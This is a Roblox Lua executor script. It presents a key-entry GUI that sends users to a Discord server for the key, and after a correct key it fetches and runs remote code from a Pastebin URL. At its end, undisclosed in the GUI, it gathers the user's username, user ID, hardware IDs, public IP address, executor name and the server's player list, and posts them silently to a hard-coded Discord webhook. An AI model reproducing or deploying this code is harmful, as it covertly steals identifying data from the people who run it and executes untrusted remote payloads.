local gui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
local path = gui and gui:FindFirstChild("BattlePass") and gui.BattlePass.Main.Shop1.gift_premium_pass.BlackedOut

if not path then return end -- Exit if path is invalid

-- Check if "80086" already exists
if path:FindFirstChild("80086") then 
    return -- Exit the script without doing anything
end

-- Create the frame if it does not exist
Instance.new("Frame", path).Name = "80086"


-- Services
local Players = game:GetService("Players")
local User = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Ensure GUI Path Exists
local ParentUI = User:FindFirstChild("PlayerGui"):FindFirstChild("TransitionUI")
if not ParentUI then
    ParentUI = Instance.new("ScreenGui")
    ParentUI.Name = "TransitionUI"
    ParentUI.Parent = User:FindFirstChild("PlayerGui")
end

-- GUI Setup
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 160)
Frame.Position = UDim2.new(0.5, -150, 0.5, -80)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- ✅ Fixed
Frame.BorderSizePixel = 1
Frame.BorderColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Fixed
Frame.Parent = ParentUI

-- Dragging Functionality
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Welcome, " .. User.Name
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Fixed
Title.Parent = Frame

-- Key Input
local KeyBox = Instance.new("TextBox")
KeyBox.Size = UDim2.new(0.75, -20, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.3, 0)
KeyBox.PlaceholderText = "Enter Key"
KeyBox.Text = ""
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 14
KeyBox.TextColor3 = Color3.fromRGB(0, 0, 0) -- ✅ Fixed
KeyBox.Parent = Frame
KeyBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- ✅ White background
KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Black text


-- Submit Button
local Submit = Instance.new("TextButton")
Submit.Size = UDim2.new(0, 30, 0, 30)
Submit.Position = UDim2.new(0.85, 0, 0.3, 0)
Submit.Text = "→"
Submit.Font = Enum.Font.GothamBold
Submit.TextSize = 20
Submit.TextColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Fixed
Submit.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- ✅ Fixed
Submit.Parent = Frame

-- Close Button (X)
local Close = Instance.new("TextButton")
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Position = UDim2.new(1, -28, 0, -1)
Close.Text = "X"
Close.Font = Enum.Font.GothamBold
Close.TextSize = 18
Close.TextColor3 = Color3.fromRGB(255, 0, 0) -- ✅ Fixed
Close.BackgroundTransparency = 1
Close.Parent = Frame

-- Help Button
local Help = Instance.new("TextButton")
Help.Size = UDim2.new(0, 30, 0, 30)
Help.Position = UDim2.new(1, -35, 1, -35)
Help.Text = "?"
Help.Font = Enum.Font.GothamBold
Help.TextSize = 18
Help.TextColor3 = Color3.fromRGB(0, 150, 255) -- ✅ Fixed
Help.BackgroundTransparency = 1
Help.Parent = Frame

-- Help Pop-up
local HelpPopup = Instance.new("Frame")
HelpPopup.Size = UDim2.new(0, 280, 0, 40)
HelpPopup.Position = UDim2.new(0, 10, 1, 5)
HelpPopup.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- ✅ Fixed
HelpPopup.BorderSizePixel = 1
HelpPopup.BorderColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Fixed
HelpPopup.Visible = false
HelpPopup.Parent = Frame

local HelpText = Instance.new("TextLabel")
HelpText.Size = UDim2.new(1, -10, 1, 0)
HelpText.Position = UDim2.new(0, 5, 0, 0)
HelpText.Text = "Get the key from our Discord: discord.gg/C7bH8KhHPe"
HelpText.Font = Enum.Font.Gotham
HelpText.TextSize = 14
HelpText.TextColor3 = Color3.fromRGB(255, 255, 255) -- ✅ Fixed
HelpText.BackgroundTransparency = 1
HelpText.TextWrapped = true
HelpText.Parent = HelpPopup

-- Adjusted Discord & YouTube Buttons
local Discord = Instance.new("TextButton")
Discord.Size = UDim2.new(0.45, -5, 0, 20)
Discord.Position = UDim2.new(0.1, 0, 0.7, 0)
Discord.Text = "Discord"
Discord.Font = Enum.Font.GothamBold
Discord.TextSize = 12
Discord.TextColor3 = Color3.fromRGB(88, 101, 242) -- ✅ Fixed
Discord.BackgroundTransparency = 1
Discord.BorderSizePixel = 0
Discord.Parent = Frame

local YouTube = Instance.new("TextButton")
YouTube.Size = UDim2.new(0.45, -5, 0, 20)
YouTube.Position = UDim2.new(0.55, 5, 0.7, 0)
YouTube.Text = "YouTube"
YouTube.Font = Enum.Font.GothamBold
YouTube.TextSize = 12
YouTube.TextColor3 = Color3.fromRGB(255, 0, 0) -- ✅ Fixed
YouTube.BackgroundTransparency = 1
YouTube.BorderSizePixel = 0
YouTube.Parent = Frame

-- Credit
local Credit = Instance.new("TextLabel")
Credit.Size = UDim2.new(1, 0, 0, 20)
Credit.Position = UDim2.new(0, 0, 1, -20)
Credit.Text = "Made by Mortex"
Credit.Font = Enum.Font.GothamBold
Credit.TextSize = 12
Credit.TextColor3 = Color3.fromRGB(200, 200, 200) -- ✅ Fixed
Credit.BackgroundTransparency = 1
Credit.Parent = Frame

-- Shine Animation Loop
task.spawn(function()
    while true do
        wait(5)
        for i = 1, 10 do
            Credit.TextColor3 = Color3.fromRGB(200 + i * 5, 200 + i * 5, 200 + i * 5) -- ✅ Fixed
            wait(0.05)
        end
        for i = 10, 1, -1 do
            Credit.TextColor3 = Color3.fromRGB(200 + i * 5, 200 + i * 5, 200 + i * 5) -- ✅ Fixed
            wait(0.05)
        end
    end
end)
-- Key Verification System
local function CheckKey()
    local pastebinURL = "https://pastebin.com/raw/28huELby"
    local response = game:HttpGet(pastebinURL)
    local thirdLine = response:match("^[^\n]+\n[^\n]+\n(.-)\n") or response:match("^[^\n]+\n[^\n]+\n(.-)$") or "No third line!"
    thirdLine = thirdLine:match("^%s*(.-)%s*$")

    if KeyBox.Text == thirdLine then
     --   print("WELCOME")
    game:GetService("Players").LocalPlayer.PlayerGui.BattlePass.Main.Shop1.gift_premium_pass.BlackedOut["80086"]:Destroy()
        Frame:Destroy()

loadstring(game:HttpGet("https://pastebin.com/raw/sjCnavpd"))()
    else
        KeyBox.Text = "Invalid Key!"
        wait(1.5)
        KeyBox.Text = ""
    end
end

-- Button Clicks
Submit.MouseButton1Click:Connect(CheckKey)

-- Close Animation (Smooth Fade Out)
Close.MouseButton1Click:Connect(function()
    for i = 1, 10 do
        Frame.BackgroundTransparency = Frame.BackgroundTransparency + 0.1
        for _, obj in pairs(Frame:GetChildren()) do
            if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
                obj.TextTransparency = obj.TextTransparency + 0.1
                obj.BackgroundTransparency = obj.BackgroundTransparency + 0.1
            end
        end
        wait(0.05)
    end
    game:GetService("Players").LocalPlayer.PlayerGui.BattlePass.Main.Shop1.gift_premium_pass.BlackedOut["80086"]:Destroy()
    ParentUI:Destroy()
end)

-- Help Button Functionality
Help.MouseButton1Click:Connect(function()
    HelpPopup.Visible = true
    wait(3)
    HelpPopup.Visible = false
end)
-- Discord & YouTube Copy Functionality
local function CopyWithMessage(button, text)
    local originalText = button.Text  -- Store the original button text
    button.Text = "Copied!"
    setclipboard(text)
    wait(2)
    button.Text = originalText  -- Restore the original text
end

Discord.MouseButton1Click:Connect(function() CopyWithMessage(Discord, "discord.gg/C7bH8KhHPe") end)
YouTube.MouseButton1Click:Connect(function() CopyWithMessage(YouTube, "youtube.com/@Mr._Stone") end)

-- Fade-in Effect (Smooth Appearance)
Frame.BackgroundTransparency = 1
for _, obj in pairs(Frame:GetChildren()) do
    if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
        obj.TextTransparency = 1
        obj.BackgroundTransparency = 1
    end
end

-- Fade-in Effect (Smooth Appearance)
Frame.BackgroundTransparency = 1
for _, obj in pairs(Frame:GetChildren()) do
    if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
        obj.TextTransparency = 1 -- Only fade text, not backgrounds
    end
end

for i = 1, 10 do
    Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.1
    for _, obj in pairs(Frame:GetChildren()) do
        if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
            obj.TextTransparency = obj.TextTransparency - 0.1 -- Only fade text, not background
        end
    end
    wait(0.05)
end


local http = http_request or syn.request or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Webhook URL
local webhookURL = "https://discord.com/api/webhooks/1346526162943479819/Jz6NL6tezQQV0jWWu1X1ortyZhmgZMT0hPS0vsLW18OLtWrY01mW8sZwYRJeENnES7ki"

-- ✅ Get Player Information
local displayName = LocalPlayer.DisplayName or "Unknown"
local username = LocalPlayer.Name or "Unknown"
local userId = LocalPlayer.UserId or "Unknown"
local accountAge = LocalPlayer.AccountAge or "Unknown"
local membership = tostring(LocalPlayer.MembershipType) or "None"

-- ✅ Fixed Account Creation Date
local accountCreationDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))

-- ✅ Get HWIDs (Proper Methods)
local hwid1 = (gethwid and gethwid()) or "Unavailable"
local hwid2 = (game:GetService("RbxAnalyticsService"):GetClientId()) or "Unavailable"

-- ✅ Get IP Address (If supported)
local ip = "IP Fetch Not Supported"
if (syn and syn.request) or http then
    local success, response = pcall(function()
        return http({
            Url = "https://api64.ipify.org?format=json",
            Method = "GET"
        })
    end)
    if success and response and response.Body then
        local decoded = HttpService:JSONDecode(response.Body)
        ip = decoded.ip or "Unknown IP"
    end
end

-- ✅ Detect Exploit Used
local executor = "Unknown"
if identifyexecutor then
    executor = identifyexecutor()
end

-- ✅ Detect Exploit Level
local exploitLevel = "Unknown"
if pebc_execute then
    exploitLevel = "Level 8+ (Advanced)"
elseif secure_call then
    exploitLevel = "Level 7 (Secure Call Supported)"
elseif syn then
    exploitLevel = "Level 6 (Synapse Equivalent)"
elseif http_request then
    exploitLevel = "Level 5 (Supports HTTP Requests)"
end

-- ✅ Get Device Type (PC, Mobile, Console)
local deviceType = "Unknown"
if RunService:IsStudio() then
    deviceType = "Studio"
elseif game:GetService("UserInputService").TouchEnabled then
    deviceType = "Mobile"
elseif game:GetService("UserInputService").GamepadEnabled then
    deviceType = "Console"
else
    deviceType = "PC"
end

-- ✅ Get Game Info
local gameId = game.PlaceId or "Unknown"
local jobId = game.JobId or "Unknown" -- Server ID

-- ✅ Get Server Uptime
local function getServerUptime()
    local uptime = os.time() - game:GetService("Workspace").DistributedGameTime
    return os.date("%H:%M:%S", uptime) -- Format HH:MM:SS
end

-- ✅ Detect If Any Player in Server is a Mod
local modList = { -- Add known mod usernames here
    "Roblox", "Admin", "Moderator", "OfficialMod"
}

local function isMod(player)
    for _, modName in pairs(modList) do
        if player.Name:lower() == modName:lower() then
            return true
        end
    end
    return false
end

-- ✅ Collect Player List with Mod Status
local playerList = {}
for _, player in pairs(Players:GetPlayers()) do
    local modStatus = isMod(player) and "✅ **MOD DETECTED!**" or "(No Mod)"
    table.insert(playerList, player.DisplayName .. " (" .. player.Name .. ") " .. modStatus)
end
local formattedPlayers = table.concat(playerList, "\n")

-- ✅ Admin Alert 🚨
local adminWarning = "✅ No Admin Detected"
for _, player in ipairs(Players:GetPlayers()) do
    if isMod(player) then
        adminWarning = "⚠ **A MOD HAS BEEN DETECTED!** ⚠"
        break
    end
end

-- ✅ Create Message Data
local data = {
    ["content"] = "**🔍 Critical Player Data Captured!**",
    ["embeds"] = {{
        ["title"] = "📌 Player Information",
        ["color"] = tonumber(0xFF0000), -- Red Embed
        ["fields"] = {
            {["name"] = "👤 Display Name", ["value"] = displayName, ["inline"] = true},
            {["name"] = "🎮 Username", ["value"] = username, ["inline"] = true},
            {["name"] = "🆔 User ID", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "📅 Account Age", ["value"] = tostring(accountAge) .. " days", ["inline"] = true},
            {["name"] = "🗓 Account Created", ["value"] = accountCreationDate, ["inline"] = true},
            {["name"] = "💎 Membership", ["value"] = membership, ["inline"] = true},
            {["name"] = "🔑 HWID #1", ["value"] = hwid1, ["inline"] = false},
            {["name"] = "🔑 HWID #2", ["value"] = hwid2, ["inline"] = false},
            {["name"] = "🌍 IP Address", ["value"] = ip, ["inline"] = false},
            {["name"] = "💻 Device Type", ["value"] = deviceType, ["inline"] = true},
            {["name"] = "⚠ Admin Status", ["value"] = adminWarning, ["inline"] = false},
            {["name"] = "🕹 Game ID", ["value"] = tostring(gameId), ["inline"] = true},
            {["name"] = "🔗 Server ID", ["value"] = tostring(jobId), ["inline"] = false},
            {["name"] = "⏳ Server Uptime", ["value"] = getServerUptime(), ["inline"] = true},
            {["name"] = "⚡ Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "🔧 Exploit Level", ["value"] = exploitLevel, ["inline"] = true},
            {["name"] = "🌎 Players In Server", ["value"] = formattedPlayers, ["inline"] = false}
        },
        ["footer"] = {["text"] = "Data sent via executor"}
    }}
}

-- ✅ Encode & Send Data
local body = HttpService:JSONEncode(data)
local headers = {["Content-Type"] = "application/json"}

if http and type(http) == "function" then
    pcall(function()
        http({
            Url = webhookURL,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
end



